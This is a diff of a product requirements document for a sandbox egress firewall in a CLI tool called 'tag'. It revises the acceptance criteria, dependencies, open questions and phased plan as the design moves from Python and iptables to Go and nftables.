-| AC-09 | After sandbox exit (normal, SIGINT, or crash), `iptables -L | grep TAG-SBX` returns no lines. | Shell assertion test |
+| AC-09 | After sandbox exit (normal, SIGINT, or panic), listing the `tag_fw` nftables table (via `google/nftables` or `nft list ruleset`) shows no `TAG-SBX-*` chain. | Integration assertion test |
 | AC-10 | `tag sandbox run --network open` on a profile with `network: restricted` in YAML overrides the profile policy and allows all egress. | Integration test |
 | AC-11 | `tag sandbox firewall add --profile coder --allow "127.0.0.0/8" --deny "*"` exits non-zero with error message "Cannot block or explicitly allow localhost CIDR 127.0.0.0/8". | CLI test |
 | AC-12 | `tag sandbox firewall add --profile coder --allow "*.github.com" --deny "*"` accepts the wildcard rule; `tag sandbox firewall show coder` displays it as `wildcard  *.github.com`. | CLI test |
-| AC-13 | On macOS (no iptables), `tag sandbox run --deny-all` prints a warning about DNS-intercept fallback and still blocks connections via the Python shim. | Manual macOS test |
+| AC-13 | On macOS (no nftables), `tag sandbox run --deny-all` prints a warning about the reduced-enforcement fallback and still blocks connections via the netguard IP-pin dialer. | Manual macOS test |
 | AC-14 | `tag sandbox firewall violations --run-id <id>` returns all violations for that run in table format; `--json` returns a valid JSON array. | CLI test |
-| AC-15 | Installing TAG without any optional extras still allows `tag sandbox firewall` commands to parse and validate (no import errors from iptables or Docker SDK). | `python -c "from tag.sandbox import FirewallPolicy"` exits 0 |
+| AC-15 | The single static binary (`CGO_ENABLED=0`) allows `tag sandbox firewall` commands to parse and validate on a host with neither nftables nor Docker present (policy management is pure-Go; enforcement degrades with a warning). | `go build ./...` with `CGO_ENABLED=0`; `tag sandbox firewall list` exits 0 on a bare host |
 
 ---
 
@@ -1080,15 +1129,18 @@ File: `tests/perf/test_sandbox_firewall_perf.py`
 
 | Dependency | Type | Notes |
 |------------|------|-------|
-| PRD-028 (Sandbox Code Execution) | Blocking | This PRD extends `sandbox.py` and the `sandbox_runs` table from PRD-028. PRD-028 must be merged first. |
-| `iptables` CLI | Optional runtime | Required for Docker backend host-level enforcement on Linux. Graceful fallback to DNS intercept when absent. |
-| `ipaddress` (stdlib) | Required | Python standard library; available in Python 3.4+. Used for CIDR parsing and matching. |
-| `threading`, `queue` (stdlib) | Required | Used for ViolationLogger background thread. |
-| `socket` (stdlib) | Required | Monkey-patched for DNS intercept in restricted subprocess backend. |
-| PRD-013 (Agent Tracing) | Optional | Violation events emitted as OTel spans if tracing is configured. Feature works without PRD-013. |
-| PRD-034 (Secret Scanning) | Reference | `security.py` path-validation patterns referenced for credential-path exclusions in mount validation; no code dependency. |
-| PRD-005 (Execution Backend Selection) | Reference | Profile YAML `execution` block structure; `network` key extends existing schema. |
-| Docker Engine | Optional runtime | Required for Docker backend. Restricted subprocess backend works without Docker. |
+| PRD-028 (Sandbox Code Execution) | Blocking | This PRD extends `internal/sandbox` and the `sandbox_runs` table from PRD-028. PRD-028 must be merged first. |
+| `github.com/google/nftables` | Go module (Apache-2.0) | Pure-Go netlink; host-level egress enforcement on Linux. Graceful fallback to the netguard dialer when the kernel subsystem is absent. |
+| `net/netip` (Go stdlib) | Required | CIDR parsing (`ParsePrefix`) and matching (`Prefix.Contains`); replaces Python `ipaddress`. |
+| Go goroutines + channels (stdlib) | Required | ViolationLogger goroutine draining a buffered channel; replaces `threading`/`queue`. |
+| `internal/netguard` (connect-time IP-pin dialer) | Internal | Userspace enforcement fallback; replaces the Python `socket` DNS-intercept shim. |
+| `modernc.org/sqlite` | Go module (BSD-3, pure-Go) | Project-wide store (WAL, `CGO_ENABLED=0`) for firewall policies/rules/violations via `internal/store`. |
+| `github.com/docker/docker` (moby client) | Go module (Apache-2.0) | Docker backend container lifecycle; host nftables applied around it. |
+| `google/gvisor` (runsc) | Optional runtime | Container-tier userspace netstack option where host nftables is unavailable. |
+| PRD-013 (Agent Tracing) | Optional | Violation events emitted as OTel spans (`go.opentelemetry.io/otel`) if tracing is configured. |
+| PRD-034 (Secret Scanning) | Reference | Path-validation patterns referenced for credential-path exclusions; no code dependency. |
+| PRD-005 (Execution Backend Selection) | Reference | Profile YAML `execution` block; `network` key extends existing schema (parsed via koanf). |
+| Docker Engine | Optional runtime | Required for Docker backend. Restricted (landlock+seccomp) subprocess backend works without Docker. |
 
 ---
 
@@ -1096,13 +1148,13 @@ File: `tests/perf/test_sandbox_firewall_perf.py`
 
 | # | Question | Owner | Resolution Target |
 |---|----------|-------|-------------------|
-| OQ-1 | Should `ip6tables` be managed in parallel with `iptables` for IPv6 enforcement? The threat model (agent code phoning home) applies equally to IPv6 destinations, but dual-stack management doubles the cleanup surface area. | Platform team | Before v1 merge |
+| OQ-1 | The `google/nftables` `inet` family covers IPv4 and IPv6 in one table; should v1 actually program IPv6 (`::/0`) prefixes and validate IPv6 in the netguard dialer, or defer IPv6 enforcement? The threat model applies equally to IPv6, but IPv6 test coverage adds surface area. | Platform team | Before v1 merge |
 | OQ-2 | Should the `pypi` built-in policy list be maintained as a static constant or fetched from a remote source (e.g., a TAG-managed JSON file) to keep pace with CDN IP changes? A remote fetch introduces a network dependency at startup. | Security team | v1.1 |
 | OQ-3 | Should violations be emitted to the existing `tracing.py` span store as child spans of the current agent run, or only to the dedicated `sandbox_firewall_violations` table? Using the span store would allow `tag trace show` to surface violations inline. | Observability team | Before v1 merge |
-| OQ-4 | The DNS-intercept shim only intercepts Python-level socket calls. A process that uses C extensions with direct `syscall(SYS_connect, ...)` bypasses the shim. Should we document this limitation explicitly, or invest in seccomp-based enforcement for the restricted backend? | Security team | v1 docs |
+| OQ-4 | The netguard IP-pin dialer only governs connections made through the Go dialer. A process issuing a raw `connect(2)` syscall (e.g. a C extension) bypasses it. Should we document this limitation explicitly, or pair it with an `elastic/go-seccomp-bpf` syscall filter on the restricted backend to block un-dialed `connect`? | Security team | v1 docs |
 | OQ-5 | Should `tag sandbox firewall add` support importing rules from a YAML file (e.g., `--from-file network-policy.yaml`) for teams managing policies in version control? This aligns with the profile YAML pattern. | CLI team | v1.1 |
 | OQ-6 | Should the built-in `custom` policy be removed in favour of requiring users to always create a named policy? The `custom` placeholder may cause confusion when multiple users on the same machine both try to use `--network custom`. | UX team | Before v1 merge |
-| OQ-7 | What is the right behaviour when iptables rules cannot be applied (permissions error) and the DNS intercept shim also fails to inject (e.g., non-Python subprocess)? Fail-open (allow all) or fail-closed (abort sandbox run)? | Security team | Before v1 merge |
+| OQ-7 | What is the right behaviour when nftables cannot be programmed (permissions error) AND the netguard dialer cannot be applied (an arbitrary non-Go subprocess)? Fail-open (allow all with warning) or fail-closed (abort the sandbox run)? | Security team | Before v1 merge |
 | OQ-8 | Should violation data be included in `tag sandbox run --json` output, or only available via `tag sandbox firewall violations --run-id`? Including it in `run` output makes scripting easier but increases the output payload size. | CLI team | v1 |
 
 ---
@@ -1113,40 +1165,39 @@ File: `tests/perf/test_sandbox_firewall_perf.py`
 
 ### Phase 1 — Core Firewall Engine (Days 1-3)
 
-- Implement `FirewallRule`, `FirewallPolicy`, `SandboxFirewallConfig`, `FirewallEngine` dataclasses in `sandbox.py`
-- Implement `BUILTIN_POLICIES` constants
-- Implement `FirewallPolicy.evaluate()` with full precedence logic
-- Add SQLite DDL (`sandbox_firewall_policies`, `sandbox_firewall_rules`, `sandbox_firewall_violations`) to `ensure_schema()`
-- Seed built-in policies on `ensure_schema()` with `INSERT OR IGNORE`
-- Unit tests for all rule matching logic and policy evaluation
-- **Deliverable:** `FirewallEngine.evaluate_connection()` is tested and correct; no CLI yet
+- Implement `FirewallRule`, `FirewallPolicy`, `SandboxFirewallConfig`, `FirewallEngine` structs + typed constants in `internal/sandbox/firewall.go` (`net/netip` for CIDR)
+- Implement `BuiltinPolicies` package values
+- Implement `FirewallPolicy.Evaluate` with full precedence logic
+- Add the SQLite DDL (`sandbox_firewall_policies`, `sandbox_firewall_rules`, `sandbox_firewall_violations`) to the `internal/store` migration runner
+- Seed built-in policies with `INSERT OR IGNORE`
+- Table-driven unit tests for all rule matching and policy evaluation
+- **Deliverable:** `FirewallEngine.EvaluateConnection` is tested and correct; no CLI yet
 
 ### Phase 2 — Enforcement Backends (Days 4-6)
 
-- Implement `apply_docker_firewall()` and `remove_docker_firewall()` using iptables subprocess calls
-- Implement `ViolationLogger` background thread with SQLite + JSONL writes
-- Implement DNS-intercept shim template and Unix socket server for restricted subprocess backend
-- Extend `_run_docker()` and `_run_restricted()` in `sandbox.py` to accept `firewall_config` and wire up enforcement
-- Extend `run_in_sandbox()` to accept `firewall_config`, start/stop `ViolationLogger`, apply enforcement
-- Register atexit and signal handlers for chain cleanup
-- Integration tests (Docker-gated): DNS intercept, iptables chain lifecycle, violation logging
-- **Deliverable:** `run_in_sandbox(firewall_config=...)` enforces rules end-to-end
+- Implement `ApplyDockerFirewall`/`RemoveDockerFirewall` over `google/nftables` (netlink, Linux build target)
+- Implement the `ViolationLogger` goroutine draining a buffered channel to SQLite + JSONL
+- Implement the `internal/netguard` connect-time IP-pin `DialContext` for the restricted-subprocess/off-Linux fallback
+- Wire enforcement into the Docker and restricted backends' `Run`; add `RunWithFirewall` starting/stopping the logger via channel close
+- Anchor chain cleanup with `defer` + `signal.NotifyContext` (SIGINT/SIGTERM/panic)
+- Integration tests (`//go:build integration`): netguard dialer, nftables chain lifecycle, violation logging
+- **Deliverable:** `RunWithFirewall(...)` enforces rules end-to-end
 
 ### Phase 3 — CLI Surface (Days 7-9)
 
-- Add `--allow-host`, `--deny-host`, `--allow-cidr`, `--deny-cidr`, `--deny-all`, `--allow-all`, `--network` flags to `cmd_sandbox_run` in `controller.py`
-- Implement `cmd_sandbox_firewall_add`, `cmd_sandbox_firewall_list`, `cmd_sandbox_firewall_show`, `cmd_sandbox_firewall_remove`, `cmd_sandbox_firewall_test`, `cmd_sandbox_firewall_violations` in `controller.py`
-- Profile YAML `network` key loading in `load_firewall_policy_for_profile()`
-- Wire `--network` flag through to `run_in_sandbox()` via `SandboxFirewallConfig`
+- Add `--allow-host`, `--deny-host`, `--allow-cidr`, `--deny-cidr`, `--deny-all`, `--allow-all`, `--network` flags to the `sandbox run` cobra command in `internal/cli`
+- Implement the `firewall add/list/show/remove/test/violations` cobra subcommands
+- Profile YAML `network` key loading via `LoadFirewallPolicyForProfile` (koanf + `internal/store`)
+- Wire `--network` through to `RunWithFirewall` via `SandboxFirewallConfig`
 - CLI tests for all 7 subcommands
 - **Deliverable:** Full `tag sandbox firewall` CLI surface functional
 
 ### Phase 4 — Polish and Performance (Day 10)
 
-- OTel span emission for violations (PRD-013 integration, if PRD-013 is merged)
-- Performance benchmarks; optimize `evaluate_connection()` for hot path
-- macOS fallback testing and warning messages
-- Documentation: `--help` text, `docs/sandbox-firewall.md` (one-page reference)
+- OTel span emission for violations via `internal/obs` (PRD-013 integration, if merged)
+- Go benchmarks; optimize `EvaluateConnection` for the hot path
+- Off-Linux (macOS/Windows) fallback testing and reduced-enforcement warning messages
+- Documentation: cobra `--help` text, `docs/sandbox-firewall.md` (one-page reference)
 - Final acceptance criteria sweep
 - **Deliverable:** All 15 AC items passing; performance targets met; ready for merge
 
